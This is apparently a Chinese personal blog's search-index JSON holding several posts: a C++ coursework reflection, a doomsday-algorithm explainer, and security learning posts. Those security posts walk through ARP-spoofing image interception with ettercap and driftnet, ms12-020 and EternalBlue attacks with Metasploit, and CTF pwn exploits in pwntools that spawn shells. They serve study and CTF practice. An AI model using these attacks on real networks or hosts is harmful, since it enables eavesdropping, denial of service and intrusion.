修改 添加 删除 统计 退出 实验结果分析，实验收获和体会 在实验初期，我通过使用结构体完成了该题目，但感觉这样无法让我更深入的了解掌握类与对象，于是我选择重做一遍，运用类与对象的知识去完成该实验。 实验中，我一开始对于文件的输入输出并不是十分了解，于是打算使用多文件存储，一个文件存储一种数据，后来经过学习思考，我逐渐掌握了文件输入输出，于是我开始使用单一文件存储数据，事实证明，这样存储数据更好。 这次实验要求在一操作结束后重新打开菜单，我一开始只用了循环去保证菜单可以重复出现，但后来觉得重复出现的菜单会导致整个程序运行起来不够整洁，我开始使用清屏函数system(“cls”)，进而掌握了这一技巧 通过本次实验，我更深入的了解并掌握了类与对象的运用知识，这对我的学习有着很大的帮助。 ","link":"https://tickertapetimer.github.io/post/C++课设/"},{"title":" 利用arp欺骗截取图片信息","content":"前言 本文仅限于学习交流所用 arp欺诈 什么是arp欺诈 ARP协议是“Address Resolution Protocol”（地址解析协议）的缩写。在局域网中，网络中实际传输的是“帧”，帧里面是有目标主机的MAC地址的。在以太网中，一个主机要和另一个主机进行直接通信，必须要知道目标主机的MAC地址。但这个目标MAC地址是如何获得的呢？它就是通过地址解析协议获得的。所谓“地址解析”就是主机在发送帧前将目标IP地址转换成目标MAC地址的过程。ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的顺利进行。所以说从某种意义上讲ARP协议是工作在更低于IP协议的协议层。这也是为什么ARP欺骗更能够让人在神不知鬼不觉的情况下出现网络故障，他的危害更加隐蔽。 arp欺诈的原理是什么 首先我们可以肯定一点的就是发送ARP欺骗包是通过一个恶毒的程序自动发送的，正常的TCP/IP网络是不会有这样的错误包发送的，而人工发送又比较麻烦。也就是说当黑客没有运行这个恶毒程序的话，网络上通信应该是一切正常的，保留在各个连接网络计算机上的ARP缓存表也应该是正确的，只有程序启动开始发送错误ARP信息以及ARP欺骗包时才会让某些计算机访问网络出现问题。接下来我们来阐述下ARP欺骗的原理。 第一步：假设这样一个网络，一个Hub或交换机连接了3台机器，依次是计算机A，B，C A的地址为：IP：192.168.1.1 MAC: AA-AA-AA-AA-AA-AA B的地址为：IP：192.168.1.2 MAC: BB-BB-BB-BB-BB-BB C的地址为：IP：192.168.1.3 MAC: CC-CC-CC-CC-CC-CC 第二步：正常情况下在A计算机上运行ARP -A查询ARP缓存表应该出现如下信息 Interface: 192.168.1.1 on Interface 0x1000003 Internet Address Physical Address Type 192.168.1.3 CC-CC-CC-CC-CC-CC dynamic 第三步：在计算机B上运行ARP欺骗程序，来发送ARP欺骗包 B向A发送一个自己伪造的ARP应答，而这个应答中的数据为发送方IP地址是192.168.10.3（C的IP地址），MAC地址是DD-DD-DD-DD-DD-DD（C的MAC地址本来应该是CC-CC-CC-CC-CC-CC，这里被伪造了）。当A接收到B伪造的ARP应答，就会更新本地的ARP缓存（A可不知道被伪造了）。而且A不知道其实是从B发送过来的，A这里只有192.168.10.3（C的IP地址）和无效的DD-DD-DD-DD-DD-DD mac地址 第四步：欺骗完毕我们在A计算机上运行ARP -A来查询ARP缓存信息。你会发现原来正确的信息现在已经出现了错误 Interface: 192.168.1.1 on Interface 0x1000003 Internet Address Physical Address Type 192.168.1.3 DD-DD-DD-DD-DD-DD dynamic 从上面的介绍我们可以清楚的明白原来网络中传输数据包最后都是要根据MAC地址信息的，也就是说虽然我们日常通讯都是通过IP地址，但是最后还是需要通过ARP协议进行地址转换，将IP地址变为MAC地址。而上面例子中在计算机A上的关于计算机C的MAC地址已经错误了，所以即使以后从A计算机访问C计算机这个192.168.1.3这个地址也会被ARP协议错误的解析成MAC地址为DD-DD-DD-DD-DD-DD的。问题也会随着ARP欺骗包针对网关而变本加厉，当局域网中一台机器，反复向其他机器，特别是向网关，发送这样无效假冒的ARP应答信息包时，严重的网络堵塞就会开始。由于网关MAC地址错误，所以从网络中计算机发来的数据无法正常发到网关，自然无法正常上网。这就造成了无法访问外网的问题，另外由于很多时候网关还控制着我们的局域网LAN上网，所以这时我们的LAN访问也就出现问题了。 以上内容均摘录于网上 利用 在kali中，打开ettercap 点开sniff，选择第一个，再选择网卡eth0 再点开hosts，选择hosts list，然后点击scan for hosts，即扫描hosts 然后选择网关，点击Add to target 1，再选择目标机IP，点击Add to target 2，然后选择mitm，点击ARP poisoning 选择第一个，（第二个是单向转发，选择第二个会导致被截留机断网） 然后点击start开始，再打开新终端，输入driftnet -i eth0开始抓取图片 看到有抓到图片，但是感觉对不上，不知道是什么原因（还在研究） ","link":"https://tickertapetimer.github.io/post/利用arp欺骗截取图片信息/"},{"title":"ms12-020以及ms17-010使用","content":"前言 Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。 渗透攻击（Exploit）,指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。 攻击载荷（Payload），是我们期望目标系统在被渗透攻击之后去执行的代码。 Shellcode，是在渗透攻击是作为攻击载荷运行的一组机器指令，通常用汇编语言编写。 模块（Module），指Metasploit框架中所使用的一段软件代码组件，可用于发起渗透攻击或执行某些辅助攻击动作。 监听器（Listener），是Metasploit中用来等待网络连接的组件。（转载） ms12-020 要利用该漏洞，必须保证kali和目标机必须处于同一内网下 首先，检测两机是否能ping通 目标机IP是192.168.1.6 ping一下试试 可以ping通 接下来打开Metasploit，在命令端输入msfconsole 然后搜索ms12-020漏洞，输入search ms12-020 这里选择第一个，输入use auxiliary/dos/windows/rdp/ms12_020_maxchannelids 然后查看有什么选项要填，发现只有一个目标机IP要填，于是填上IP192.168.1.6 开始运行漏洞 发现运行不了 哦，没开RDP服务啊，那没事了。。。 回到目标机，开启RDP 然后再运行一次 直接蓝屏，成功了。 ms17-010 这是当初鹏城实验室师兄让学习利用的漏洞，当时不会，现在拿出来照葫芦画瓢尝试利用 众所周知，ms17-010漏洞需要目标机开启445端口，于是先用nmap扫一下，看看有没有开放该端口 输入nmap –sS –sV –Pn 192.168.0.101即可进行扫描，-sS 是半开放扫描，比普通扫描要快,-sV是版本检测,-Pn是不对目标主机进行存活性判断，直接扫描，注意，目标机不要开防火墙，扫不到的 发现445端口开放，可以进行下一步 首先查找ms17-010漏洞 选择auxiliary/scanner/smb/smb_ms17_010模块进行探测 填入目标机IP探测 显示很可能具有该漏洞，可以开始渗透 选择使用exploit/windows/smb/ms17_010_eternalblue进行渗透 操作基本一致，运行 出现win的字样时说明成功了，按下回车出现win7的cmd窗口，说明已经渗透进去了 在桌面创建一个txt文件试试 创建成功！说明渗透成功了 总结 ms12-020和ms17-010两个漏洞都是N年前的漏洞了，这种漏洞放在现在的电脑都基本失效了，仅做学习参考使用。 ","link":"https://tickertapetimer.github.io/post/ms12-020以及ms17-010使用/"},{"title":"末日算法","content":"末日是周几？ 假设你知道若干年后的某一天是末日，你想要知道那一天是不是星期四，以便于去抢购肯德基，你会怎么做？ 通常，我们应该会打开手机查，如果有妹子也想知道，那你这时如果手算出来，岂不是能装一波逼(妙哉) 那么我们要怎么手算呢？ 我们最容易想到的一种方法是：根据今天的日期，求得末日当天距离今天的天数，然后取余7得到那天是周几。 但是那样子很麻烦，要算过去的这么多年里面有多少个闰年，然后全部加起来后取余7，计算量可能有亿点点大。 末日算法 美国的约翰·康威教授给出了一个相对优化的算法，即末日算法。 PS:康威教授也是生命游戏的创建者，在数学领域有很多贡献。 末日算法：假设每一年2月的最后一天是末日，因此每一年的3月7日，4月4日，5月9日，6月6日，7月11日，8月8日，9月5日，10月10日，11月7日，12月12日的星期必然和末日的星期相同，因为这些日期和末日相差的天数正好是7的倍数。除此之外，因为平年一年365天，闰年一年366天，所以每过一个平年，末日的星期数加1，每过一个闰年，末日的星期数加2（365 % 7 = 1， 366 % 7 = 2）。这样一来，只要我们知道某一年的末日是星期几，就可以按照末日算法的思路快速地计算出目标日期是星期几。 当然，这样子计算量只简化了一丢丢，但是这很有趣，不是吗。 但同时，我们要知道这个算法的一个关键地方：闰年。 笔者曾以为闰年是指被4整除的年份，但后来查资料发现，闰年并不是这样规定的 我们先来了解一下。“年”代表地球围绕太阳公转一周所耗的时间，“月”代表从一个满月到下一个满月所耗的时间，“日‘代表地球自转一周所耗的时间，这些都是需要准确掌握季节变化的的农耕文化为中心发展的”刻度“。但是令人可恼的是，无论如何精确制作这种刻度，都不能与太阳、地球、月球三者的运动100%吻合。 例如，两个满月之间的实际平均时间为 29.5 日。若将所有月份都定义为29.5日，那么一年应该是364日。如果制作一年为354日的日历，那么随着时间的流逝，会发生月份和季节不相符的现象。为了弥补这个缺陷。埃及天文学家最早设计了我们今天所用的 365 天、每 4 年 增加 1天的 ”算法“。虽然这种月历使用了相当长的时间，但还是会有微小的误差。微小的误差累计到1582年时，月历与季节相差了6日。最终，当初的教皇格雷戈里十三世宣布，一个新世纪开始的年份（即能被100整除的年份）若不能被400整除，则不是闰年。 上述规则总结为： 1、如果年份能够被 4 整除，那么该年份是2月份需要添加 1 日的 “闰年”。因闰年多出 1 日，所以当年为 366 日。 2、如果年份能被 100 整除（即新世纪开始的年份）但不能被 400 整除，那么该年不是闰年。 所以，2100这类不算是闰年。 Q：已知2020年2月最后一天为周六，2175年2月15日为末日，那么在那天你能不能吃一顿美味的肯德基呢？ 虽然你也活不到那时候 A：根据末日算法，年份差为2175-2020=155，闰年数为155/4=38余3，因为2100年不是闰年，所以闰年数减一，加的星期数为155+37=192，192%7=3，周六加三天等于周二，所以2175年的3月7日为周二，倒推可得2175年的2月15日为周三，真是一个悲伤的故事，那天是周三 令人惋惜的是，这个算法的创建者，康威教授，在4月11日因为新冠肺炎去世了。 逝者安息 ","link":"https://tickertapetimer.github.io/post/末日算法/"},{"title":"格式化字符串漏洞之crack","content":"crack 这是一道格式化字符串题 打开IDA，看源码。 他读取了密码，然后要求你输入的字符要匹配该密码 可以看到printf那里存在格式化字符串漏洞 该文件给出了password的bss字段地址 用gdb调试看看 发现，name后面要求输入的参数是printf的第10个，所以可知偏移量为10 百度了一波，发现有一个fmtstr_payload函数，可以直接改password的值（原理不太懂） 于是构造payload试试 from pwn import* p=process('./crack') payload = fmtstr_payload(10,{0x804A048:1111}) p.recvuntil('What your name ? ') p.sendline(payload) p.recvuntil('Your password :') p.sendline('1111') p.recv() p.interactive() OJBK ","link":"https://tickertapetimer.github.io/post/格式化字符串漏洞之crack/"},{"title":"pwn3","content":"pwn3 二进制作业，来自Tamu19(不知道是啥来的)的一道题 打开IDA echo函数会打印s的地址，并且gets函数没有限制s输入长度，于是构造shellcode在栈上，将返回地址覆盖为s的地址，使其跳转执行shellcode 构造payload from pwn import * p=process('./pwn3') a = p.recvline() b = a.strip('Take this, you might need it on your journey ') c = b.strip('!\\n') add = int(c,16) print c shellcode = asm(shellcraft.sh()) payload = shellcode + 'a'*(0x12E-len(shellcode)) + p32(add) p.sendline(payload) p.interactive() ojbk ","link":"https://tickertapetimer.github.io/post/pwn3/"},{"title":"just_do_it","content":"just_do_it 二进制的作业，一道来自TokyoWesterns 2017 ctf的题 打开IDA 可以发现s允许输入的大小为32个字节，再看栈上面的情况 发现s的长度一旦超出16的字节，就会覆盖别的变量内容 又看到一个v6变量，它会打印值，而v6在栈上刚好是可以被s覆盖的var_C，而且看到一个flag变量从flag.txt中获取了一段字符，很有可能是flag，flag变量在bss字段，于是查看flag的地址 构造payload from pwn import * p = process('./just_do_it') flag=p32(0x0804A080) p.recvuntil(&quot;password.\\n&quot;) payload='a'*20+flag p.sendline(payload) p.interactive() ojbk ","link":"https://tickertapetimer.github.io/post/just-do-it/"},{"title":"整数型溢出","content":"参考xctf的一道整数型溢出 整数溢出三种类型： 1、溢出 只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出。 溢出标志 OF 可检测有符号数的溢出。 2、回绕 无符号数 0-1 时会变成最大的数，如 1 字节的无符号数会变为 255，而 255+1 会变成最小数 0。 进位标志 CF 可检测无符号数的回绕。 3、截断 将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断。 参考下图的回绕可有助于了解 xctf的这道int_overflow就是利用了回绕 观察ida的login函数可以看到用来表示密码变量的buf设置的长度极长，这就提供了回绕的空间； 在check_passwd函数中更是发现了传递buf变量值的S变量是无符号整型，基本确定是回绕，ida中显示判断条件为3到8，所以构造字节大小应为(256+3)~(256+8)，且S覆盖到的dest变量的长度为0x14； 在整体观察函数时，发现一个get_flag函数，于是利用这个函数的返回地址构造payload； PS：get_flag的返回地址不是command那个，而是在该函数的上层函数what_is_this里面的一个返回地址。 在观察这个地址时还发现了leave(出栈)，所以要在溢出时多分配四个字节，所以构造payload为'a'*0x14+'a'*4+p32(get_flag address)+'a'*(256+(3~8)-0x14-4-4)。 ","link":"https://tickertapetimer.github.io/post/整数型溢出/"},{"title":"BUUCTF_warmup_csaw_2016_writeup","content":"BUUCTF warmup_csaw_2016 打开IDA，发现 PS：这个题直接把函数位置给了。。。 可以看出，gets绝对有问题，v5的长度为0x40，同时加上返回地址8个字节，所以要溢出总长度为0x48，在运行程序时可以看到sub_40060D的地址就为0x40060D… 所以构建payload：payload = ’a’ * 0x48 + p64(0x40060D)，得flag： ","link":"https://tickertapetimer.github.io/post/BUUCTF-warmup-csaw-2016-writeup/"},{"title":"哀悼·铭记","content":"哀悼·铭记 ","link":"https://tickertapetimer.github.io/post/哀悼·铭记/"},{"title":"栈溢出初级学习之level2","content":"level2 这个是xctf的一道新手pwn题 打开IDA，看到源码 明显的一批的溢出点 char buf; // [sp+0h] [bp-88h] read(0, &amp;buf, 0x100u); 但是这道题也没有system('/bin/sh')就离谱 理性分析可以发现，有个函数叫_system，破案了，应该是要构造一个system('/bin/sh')来用 于是在IDA中搜索'/bin/sh' 找到这个地址就好办了，再找下函数_system的地址， 可以了，构造payload from pwn import * context(os='linux',arch='i386',log_level='debug') p = process('./level2_return_to_libc') payload = 0x88*'a'+'a'*4+p32(0x08048320)+p32(1)+p32(0x0804A024) p.sendline(payload) p.interactive() OJBK ","link":"https://tickertapetimer.github.io/post/栈溢出初级之level2/"},{"title":"栈溢出初级学习之level1","content":"level1 昨天发现虚拟机出问题了，然后决定嫖炮哥的虚拟机（炮哥nb!） 搞好了虚拟机后，开始做题，IDA看源码 从源码中可看出buf长度为0x88，加上esp，总长度为0x8c； 但是在IDA观察时，没有看到有binsh，所以要pwn成功，就要构建一个binsh放到栈上 使用shellcode = asm(shellcraft.sh())构建一个shellcode 然后要怎么调用呢？可以通过将shellcode覆盖buf，再用垃圾字符填充到返回地址，再用buf地址覆盖返回地址，完成我调我自己操作 在图中发现代码printf(&quot;What's this:%p?\\n&quot;, &amp;buf);可以打印buf的地址，但是每次打印地址都不同 所以要通过add = int(p.recvline()[14:-2],16)获取并截断出buf的地址 下面是payload： from pwn import * context(os='linux',arch='i386',log_level='debug') p = process('./level1_shellcode') shellcode = asm(shellcraft.sh()) add = int(p.recvline()[14:-2],16) payload=shellcode+'a'*(0x8c-len(shellcode))+p32(add) p.sendline(payload) p.interactive() ","link":"https://tickertapetimer.github.io/post/栈溢出初级学习之level1/"}]}